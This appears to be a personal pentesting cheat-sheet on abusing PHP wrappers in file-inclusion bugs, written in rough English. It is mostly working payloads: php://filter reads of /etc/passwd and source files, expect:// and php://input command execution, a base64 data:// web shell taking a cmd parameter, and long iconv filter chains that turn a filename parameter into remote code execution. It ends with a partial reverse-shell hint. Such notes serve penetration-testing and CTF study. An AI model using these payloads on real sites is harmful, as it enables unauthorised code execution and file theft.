# Convert to base64

This wrapper represent the information in base64

````python
php://filter/convert.base64-encode/resource=/etc/passwd
````

----

# Rotate the characters in 13 positions

````python
php://filter/read=string.rot13/resource=secret.php
````

Then you can rotate the positions with **tr**

````bash
cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'
````

In the first block:
The code to rotate start by can and finish de alphabet, next you have to finish the rest of the alphabet and repeat the same in mayus.

Second block:
Convert to:

Where is the c you want to see a **p** and then finish the alphabet

-----

# Convert utf-8 to utf-16
To see these response **you have to see the source code**

````python
php://filter/convert.iconv.utf-8.utf-16/resource=secret.php
````

---

# Wrapper that allow to execute commands | Wrappers to do an RCE

````python
expect://whoami
````

## Send data

````python
# Rember, put the petition in POST
php://input
# ....
# ....
# ....
# ....

<?php  system('whoami'); ?>

````

You have to change the petition to **POST**

------

## Executing commands with base64

````python
data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKSA/Pg==
````

This string in base64 means that:
````php
<?php system('whoami') ?>
````

### You can control the command with an param in the url

````python
<?php system($_GET['cmd']); ?>
````

If don't work think that the string can be url encode some character, you can url enconde all

In the url would look something like this:
````python
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b&cmd=whoami
````

Look the concatenation with & and the param that we put

---

# Filter Chains

Represent a character in other format

`convert.iconv.UTF8.UTF7` --> To avoid the problems in case that the string have \==

````python
php://filter/convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/tmp/test'
````

You can add character when and remove the last when you (in base64) when use this:
1. Change UTF8 to CSISO2022KR
2. Decode  the information from base64
3. Convert the information in base64

In this example the String don't have \==

````python
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=/tmp/test'
````

![](../../../Images/Pasted%20image%2020230712144605.png)

You can put /etc/passwd...

Or you can create some characters and after change this 

````python
php://filter/convert.iconv.UTF8.CSISO2022KR/resource=php://temp
````


`php://temp` --> Allow to keep data temporally. This is very useful when you don't know any resource you can use this wrapper 

If you want to put the characters you have to turn it, e.x --> hello --> olleh

If you mode interactive with php you can see that you put an a at the first of all:

````php
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp');" | xxd
````

You can see that we obtain an **o**

![](../../../Images/Pasted%20image%2020230712150354.png)

To add an l you have to do the same but adding the content:

1. At the end you have to add a pipe, add the new characters (that is in the script of the automation tool )
2. add decode, encode and UTF8 to UTF7 to solution the problem with =\= (`convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7`)

````php
 php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp');" | xxd
````

Equal with all the rest of characters....

````php
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp');" | xxd
````

![](../../../Images/Pasted%20image%2020230712151403.png|1500)

You can put this in a url to **inject command**

````python
http://localhost/?filename=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
````

# Automation tool

https://github.com/synacktiv/php_filter_chain_generator

When you use the tool you can use:
````php
<?php sytem($_GET['cmd']); ?>
````

This allow you to put command using the parameter cmd in the url like this:  

>&cmd=id

Remember that you have tu URL encode some characters like (&)

And then you can use a reverse shell | bash -c "bash -i >%26 /dev/...."

---

# Tags

#wrappers #filterchains 

---